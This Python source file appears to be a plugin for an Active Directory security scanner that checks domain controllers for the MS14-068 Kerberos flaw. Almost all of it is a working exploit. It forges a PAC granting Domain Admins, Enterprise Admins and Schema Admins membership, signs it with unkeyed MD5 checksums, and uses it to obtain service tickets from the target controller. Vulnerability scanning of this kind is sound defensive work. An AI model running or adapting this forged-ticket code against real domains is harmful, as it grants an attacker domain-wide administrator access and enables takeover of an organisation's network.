import datetime
import random
from calendar import timegm
from time import strptime

from Cryptodome.Hash import MD5
from impacket.dcerpc.v5 import samr, transport
from impacket.dcerpc.v5.dtypes import RPC_SID
from impacket.dcerpc.v5.ndr import NDRULONG
from impacket.dcerpc.v5.rpcrt import (TypeSerialization1)
from impacket.dcerpc.v5.samr import (GROUP_MEMBERSHIP, NULL, SE_GROUP_ENABLED,
                                     SE_GROUP_ENABLED_BY_DEFAULT,
                                     SE_GROUP_MANDATORY,
                                     USER_DONT_EXPIRE_PASSWORD,
                                     USER_NORMAL_ACCOUNT)
from impacket.krb5 import constants
from impacket.krb5.asn1 import (AD_IF_RELEVANT, AP_REQ, AS_REP, ETYPE_INFO2_ENTRY,
                                KERB_PA_PAC_REQUEST, TGS_REP, TGS_REQ,
                                Authenticator, AuthorizationData, EncASRepPart,
                                EncTGSRepPart, seq_set, seq_set_iter)
from impacket.krb5.crypto import Key
from impacket.krb5.kerberosv5 import (getKerberosTGS,
                                      getKerberosTGT, sendReceive)
from impacket.krb5.pac import (KERB_SID_AND_ATTRIBUTES, KERB_VALIDATION_INFO,
                               PAC_CLIENT_INFO, PAC_CLIENT_INFO_TYPE,
                               PAC_INFO_BUFFER, PAC_LOGON_INFO,
                               PAC_PRIVSVR_CHECKSUM, PAC_SERVER_CHECKSUM,
                               PAC_SIGNATURE_DATA, PACTYPE,
                               PKERB_VALIDATION_INFO)
from impacket.krb5.types import KerberosTime, Principal, Ticket
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from plugins.AD import PluginADScanBase
from utils import output
from utils.consts import AllPluginTypes


class PluginADMS14068(PluginADScanBase):
    """
    MS14068漏洞探测
    """

    display = "MS14068漏洞探测"
    alias = "ms14_068"
    p_type = AllPluginTypes.Scan

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def run_script(self, args) -> dict:
        dumper = MS14068(self.ldap_username, self.ldap_conf.get('password'), domain=self.dc_domain,
                         target=self.dc_hostname, kdcHost=self.dc_ip)
        code, reason = dumper.check()
        self.result['status'] = code
        if code == -1:
            if 'KRB_AP_ERR_SKEW(Clock skew too great)' in str(reason):
                reason = '与域控时钟不同步'
            self.result['error'] = str(reason)
        if code == 1:
            self.result['instance_list'] = [{"ip address": self.dc_ip}]

        return self.result


class MS14068:
    # 6.1.  Unkeyed Checksums
    # Vulnerable DCs are accepting at least these unkeyed checksum types
    CRC_32 = 1
    RSA_MD4 = 2
    RSA_MD5 = 7

    class VALIDATION_INFO(TypeSerialization1):
        structure = (('Data', PKERB_VALIDATION_INFO),)

    def __init__(self, username='', password='', domain='', target='',
                 hashes=None, command='', kdcHost=None):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__target = target
        self.__lmhash = ''
        self.__nthash = ''
        self.__forestSid = None
        self.__kdcHost = kdcHost

    def getGoldenPAC(self, authTime):
        # Ok.. we need to build a PAC_TYPE with the following items
        domainSid, rid = self.getUserSID()

        # 1) KERB_VALIDATION_INFO
        aTime = timegm(strptime(str(authTime), '%Y%m%d%H%M%SZ'))

        unixTime = getFileTime(aTime)

        kerbdata = KERB_VALIDATION_INFO()

        kerbdata['LogonTime']['dwLowDateTime'] = unixTime & 0xffffffff
        kerbdata['LogonTime']['dwHighDateTime'] = unixTime >> 32

        # LogoffTime: A FILETIME structure that contains the time the client's logon
        # session should expire. If the session should not expire, this structure
        # SHOULD have the dwHighDateTime member set to 0x7FFFFFFF and the dwLowDateTime
        # member set to 0xFFFFFFFF. A recipient of the PAC SHOULD<7> use this value as
        # an indicator of when to warn the user that the allowed time is due to expire.
        kerbdata['LogoffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['LogoffTime']['dwHighDateTime'] = 0x7FFFFFFF

        # KickOffTime: A FILETIME structure that contains LogoffTime minus the user
        # account's forceLogoff attribute ([MS-ADA1] section 2.233) value. If the
        # client should not be logged off, this structure SHOULD have the dwHighDateTime
        # member set to 0x7FFFFFFF and the dwLowDateTime member set to 0xFFFFFFFF.
        # The Kerberos service ticket end time is a replacement for KickOffTime.
        # The service ticket lifetime SHOULD NOT be set longer than the KickOffTime of
        # an account. A recipient of the PAC SHOULD<8> use this value as the indicator
        # of when the client should be forcibly disconnected.
        kerbdata['KickOffTime']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['KickOffTime']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['PasswordLastSet']['dwLowDateTime'] = 0
        kerbdata['PasswordLastSet']['dwHighDateTime'] = 0

        kerbdata['PasswordCanChange']['dwLowDateTime'] = 0
        kerbdata['PasswordCanChange']['dwHighDateTime'] = 0

        # PasswordMustChange: A FILETIME structure that contains the time at which
        # theclient's password expires. If the password will not expire, this
        # structure MUST have the dwHighDateTime member set to 0x7FFFFFFF and the
        # dwLowDateTime member set to 0xFFFFFFFF.
        kerbdata['PasswordMustChange']['dwLowDateTime'] = 0xFFFFFFFF
        kerbdata['PasswordMustChange']['dwHighDateTime'] = 0x7FFFFFFF

        kerbdata['EffectiveName'] = self.__username
        kerbdata['FullName'] = ''
        kerbdata['LogonScript'] = ''
        kerbdata['ProfilePath'] = ''
        kerbdata['HomeDirectory'] = ''
        kerbdata['HomeDirectoryDrive'] = ''
        kerbdata['LogonCount'] = 0
        kerbdata['BadPasswordCount'] = 0
        kerbdata['UserId'] = rid
        kerbdata['PrimaryGroupId'] = 513

        # Our Golden Well-known groups! :)
        groups = (513, 512, 520, 518, 519)
        kerbdata['GroupCount'] = len(groups)

        for group in groups:
            groupMembership = GROUP_MEMBERSHIP()
            groupId = NDRULONG()
            groupId['Data'] = group
            groupMembership['RelativeId'] = groupId
            groupMembership[
                'Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['GroupIds'].append(groupMembership)

        kerbdata['UserFlags'] = 0
        kerbdata[
            'UserSessionKey'] = b'\x00' * 16
        kerbdata['LogonServer'] = ''

        kerbdata['LogonDomainName'] = self.__domain
        kerbdata['LogonDomainId'] = domainSid
        kerbdata['LMKey'] = b'\x00' * 8
        kerbdata[
            'UserAccountControl'] = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD
        kerbdata['SubAuthStatus'] = 0
        kerbdata['LastSuccessfulILogon']['dwLowDateTime'] = 0
        kerbdata['LastSuccessfulILogon']['dwHighDateTime'] = 0
        kerbdata['LastFailedILogon']['dwLowDateTime'] = 0
        kerbdata['LastFailedILogon']['dwHighDateTime'] = 0
        kerbdata['FailedILogonCount'] = 0
        kerbdata['Reserved3'] = 0

        # AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY: A SID that means the client's identity is
        # asserted by an authentication authority based on proof of possession of client credentials.
        # extraSids = ('S-1-18-1',)
        if self.__forestSid is not None:
            extraSids = ('%s-%s' % (self.__forestSid, '519'),)
            kerbdata['SidCount'] = len(extraSids)
            kerbdata['UserFlags'] |= 0x20
        else:
            extraSids = ()
            kerbdata['SidCount'] = len(extraSids)

        for extraSid in extraSids:
            sidRecord = KERB_SID_AND_ATTRIBUTES()
            sid = RPC_SID()
            sid.fromCanonical(extraSid)
            sidRecord['Sid'] = sid
            sidRecord[
                'Attributes'] = SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
            kerbdata['ExtraSids'].append(sidRecord)

        kerbdata['ResourceGroupDomainSid'] = NULL
        kerbdata['ResourceGroupCount'] = 0
        kerbdata['ResourceGroupIds'] = NULL

        validationInfo = self.VALIDATION_INFO()
        validationInfo['Data'] = kerbdata
        output.debug('VALIDATION_INFO')

        # validationInfo.dump()

        validationInfoBlob = validationInfo.getData(
        ) + validationInfo.getDataReferents()
        validationInfoAlignment = b'\x00' * ((
                                                     (len(validationInfoBlob) + 7) // 8 * 8) - len(validationInfoBlob))

        # 2) PAC_CLIENT_INFO
        pacClientInfo = PAC_CLIENT_INFO()
        pacClientInfo['ClientId'] = unixTime
        try:
            name = self.__username.encode('utf-16le')
        except UnicodeDecodeError:
            import sys
            name = self.__username.decode(
                sys.getfilesystemencoding()).encode('utf-16le')
        pacClientInfo['NameLength'] = len(name)
        pacClientInfo['Name'] = name
        pacClientInfoBlob = pacClientInfo.getData()
        pacClientInfoAlignment = b'\x00' * ((
                                                    (len(pacClientInfoBlob) + 7) // 8 * 8) - len(pacClientInfoBlob))

        # 3) PAC_SERVER_CHECKSUM/PAC_SIGNATURE_DATA
        serverChecksum = PAC_SIGNATURE_DATA()

        # If you wanna do CRC32, uncomment this
        # serverChecksum['SignatureType'] = self.CRC_32
        # serverChecksum['Signature'] = b'\x00'*4

        # If you wanna do MD4, uncomment this
        # serverChecksum['SignatureType'] = self.RSA_MD4
        # serverChecksum['Signature'] = b'\x00'*16

        # If you wanna do MD5, uncomment this
        serverChecksum['SignatureType'] = self.RSA_MD5
        serverChecksum['Signature'] = b'\x00' * 16

        serverChecksumBlob = serverChecksum.getData()
        serverChecksumAlignment = b'\x00' * ((
                                                     (len(serverChecksumBlob) + 7) // 8 * 8) - len(serverChecksumBlob))

        # 4) PAC_PRIVSVR_CHECKSUM/PAC_SIGNATURE_DATA
        privSvrChecksum = PAC_SIGNATURE_DATA()

        # If you wanna do CRC32, uncomment this
        # privSvrChecksum['SignatureType'] = self.CRC_32
        # privSvrChecksum['Signature'] = b'\x00'*4

        # If you wanna do MD4, uncomment this
        # privSvrChecksum['SignatureType'] = self.RSA_MD4
        # privSvrChecksum['Signature'] = b'\x00'*16

        # If you wanna do MD5, uncomment this
        privSvrChecksum['SignatureType'] = self.RSA_MD5
        privSvrChecksum['Signature'] = b'\x00' * 16

        privSvrChecksumBlob = privSvrChecksum.getData()
        privSvrChecksumAlignment = b'\x00' * ((
                                                      (len(privSvrChecksumBlob) + 7) // 8 * 8) -
                                              len(privSvrChecksumBlob))

        # The offset are set from the beginning of the PAC_TYPE
        # [MS-PAC] 2.4 PAC_INFO_BUFFER
        offsetData = 8 + len(PAC_INFO_BUFFER().getData()) * 4

        # Let's build the PAC_INFO_BUFFER for each one of the elements
        validationInfoIB = PAC_INFO_BUFFER()
        validationInfoIB['ulType'] = PAC_LOGON_INFO
        validationInfoIB['cbBufferSize'] = len(validationInfoBlob)
        validationInfoIB['Offset'] = offsetData
        offsetData = (offsetData + validationInfoIB['cbBufferSize'] +
                      7) // 8 * 8

        pacClientInfoIB = PAC_INFO_BUFFER()
        pacClientInfoIB['ulType'] = PAC_CLIENT_INFO_TYPE
        pacClientInfoIB['cbBufferSize'] = len(pacClientInfoBlob)
        pacClientInfoIB['Offset'] = offsetData
        offsetData = (offsetData + pacClientInfoIB['cbBufferSize'] +
                      7) // 8 * 8

        serverChecksumIB = PAC_INFO_BUFFER()
        serverChecksumIB['ulType'] = PAC_SERVER_CHECKSUM
        serverChecksumIB['cbBufferSize'] = len(serverChecksumBlob)
        serverChecksumIB['Offset'] = offsetData
        offsetData = (offsetData + serverChecksumIB['cbBufferSize'] +
                      7) // 8 * 8

        privSvrChecksumIB = PAC_INFO_BUFFER()
        privSvrChecksumIB['ulType'] = PAC_PRIVSVR_CHECKSUM
        privSvrChecksumIB['cbBufferSize'] = len(privSvrChecksumBlob)
        privSvrChecksumIB['Offset'] = offsetData
        # offsetData = (offsetData+privSvrChecksumIB['cbBufferSize'] + 7) //8 *8

        # Building the PAC_TYPE as specified in [MS-PAC]
        buffers = validationInfoIB.getData() + pacClientInfoIB.getData() + serverChecksumIB.getData() + \
                  privSvrChecksumIB.getData() + validationInfoBlob + validationInfoAlignment + \
                  pacClientInfo.getData() + pacClientInfoAlignment
        buffersTail = serverChecksum.getData(
        ) + serverChecksumAlignment + privSvrChecksum.getData(
        ) + privSvrChecksumAlignment

        pacType = PACTYPE()
        pacType['cBuffers'] = 4
        pacType['Version'] = 0
        pacType['Buffers'] = buffers + buffersTail

        blobToChecksum = pacType.getData()

        # If you want to do CRC-32, ucomment this

        # If you want to do MD5, ucomment this
        serverChecksum['Signature'] = MD5.new(blobToChecksum).digest()
        privSvrChecksum['Signature'] = MD5.new(
            serverChecksum['Signature']).digest()

        buffersTail = serverChecksum.getData(
        ) + serverChecksumAlignment + privSvrChecksum.getData(
        ) + privSvrChecksumAlignment
        pacType['Buffers'] = buffers + buffersTail

        authorizationData = AuthorizationData()
        authorizationData[0] = noValue
        authorizationData[0]['ad-type'] = int(
            constants.AuthorizationDataType.AD_WIN2K_PAC.value)
        authorizationData[0]['ad-data'] = pacType.getData()
        return encoder.encode(authorizationData)

    def getKerberosTGS(self, serverName, domain, kdcHost, tgt, cipher,
                       sessionKey, authTime):
        # Get out Golden PAC
        goldenPAC = self.getGoldenPAC(authTime)

        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        # Now put the goldenPac inside the AuthorizationData AD_IF_RELEVANT
        ifRelevant = AD_IF_RELEVANT()
        ifRelevant[0] = noValue
        ifRelevant[0]['ad-type'] = int(
            constants.AuthorizationDataType.AD_IF_RELEVANT.value)
        ifRelevant[0]['ad-data'] = goldenPAC

        encodedIfRelevant = encoder.encode(ifRelevant)

        # Key Usage 4
        # TGS-REQ KDC-REQ-BODY AuthorizationData, encrypted with
        # the TGS session key (Section 5.4.1)
        encryptedEncodedIfRelevant = cipher.encrypt(sessionKey, 4,
                                                    encodedIfRelevant, None)

        tgsReq = TGS_REQ()
        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = decodedTGT['crealm'].prettyPrint()

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.SystemRandom().getrandbits(31)
        seq_set_iter(reqBody, 'etype', (cipher.enctype,))
        reqBody['enc-authorization-data'] = noValue
        reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
        reqBody['enc-authorization-data'][
            'cipher'] = encryptedEncodedIfRelevant

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = decodedTGT['crealm'].prettyPrint()

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7,
                                                       encodedAuthenticator,
                                                       None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(
            constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = False
        encodedPacRequest = encoder.encode(pacRequest)

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(
            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        tgsReq['padata'][1]['padata-value'] = encodedPacRequest

        message = encoder.encode(tgsReq)

        r = sendReceive(message, domain, kdcHost)

        # Get the session key
        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
        cipherText = tgs['enc-part']['cipher']

        # Key Usage 8
        # TGS-REP encrypted part (includes application session
        # key), encrypted with the TGS session key (Section 5.4.2)
        plainText = cipher.decrypt(sessionKey, 8, cipherText)

        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

        newSessionKey = Key(cipher.enctype,
                            encTGSRepPart['key']['keyvalue'].asOctets())

        return r, cipher, sessionKey, newSessionKey

    def getUserSID(self):
        stringBinding = r'ncacn_np:%s[\pipe\samr]' % self.__kdcHost

        rpctransport = transport.DCERPCTransportFactory(stringBinding)

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(self.__username, self.__password,
                                         self.__domain, self.__lmhash,
                                         self.__nthash)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(samr.MSRPC_UUID_SAMR)
        resp = samr.hSamrConnect(dce)
        serverHandle = resp['ServerHandle']
        resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle,
                                                 self.__domain)
        domainId = resp['DomainId']
        resp = samr.hSamrOpenDomain(dce, serverHandle, domainId=domainId)
        domainHandle = resp['DomainHandle']
        resp = samr.hSamrLookupNamesInDomain(dce, domainHandle,
                                             (self.__username,))
        # Let's pick the relative ID
        rid = resp['RelativeIds']['Element'][0]['Data']
        # logger.info("User SID: %s-%s" % (domainId.formatCanonical(), rid))
        return domainId, rid

    def check(self):
        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        output.debug('Attacking domain controller %s' % self.__kdcHost)
        exception = None
        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                None,
                self.__kdcHost,
                requestPAC=False)

            # So, we have the TGT, now extract the new session key and finish
            asRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
            # If the cypher in use != RC4 there's gotta be a salt for us to use
            salt = ''
            # if asRep['padata']:
            for pa in asRep['padata']:
                if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                    etype2 = decoder.decode(pa['padata-value'][2:], asn1Spec=ETYPE_INFO2_ENTRY())[0]
                    salt = etype2['salt'].prettyPrint()
            cipherText = asRep['enc-part']['cipher']
            # Key Usage 3
            # AS-REP encrypted part (includes TGS session key or
            # application session key), encrypted with the client key
            # (Section 5.4.2)
            if self.__nthash != '':
                key = Key(cipher.enctype, self.__nthash)
            else:
                key = cipher.string_to_key(self.__password, salt, None)

            plainText = cipher.decrypt(key, 3, cipherText)
            encASRepPart = decoder.decode(plainText,
                                          asn1Spec=EncASRepPart())[0]
            authTime = encASRepPart['authtime']

            serverName = Principal(
                'krbtgt/%s' % self.__domain.upper(),
                type=constants.PrincipalNameType.NT_PRINCIPAL.value)

            tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(
                serverName, self.__domain, self.__kdcHost, tgt, cipher,
                sessionKey, authTime)

            serverName = Principal(
                'cifs/%s' % self.__target.upper(),
                type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, self.__domain,
                                                                                self.__kdcHost, tgs, cipher,
                                                                                sessionKey)
        except Exception as e:
            exception = e

        if exception is None:
            # Success!
            # logger.info('%s found vulnerable!' % self.__kdcHost)
            return 1, ''
        elif 'KRB_ERR_GENERIC' in str(exception) or 'KRB_AP_ERR_BAD_INTEGRITY' in str(exception):
            # target is not vulnerable
            # logger.info('%s seems not vulnerable (%s)' % (self.__kdcHost, exception))
            return 0, ''
        else:
            # logger.error(f'{exception}')
            return -1, exception


def getFileTime(t):
    t *= 10000000
    t += 116444736000000000
    return t
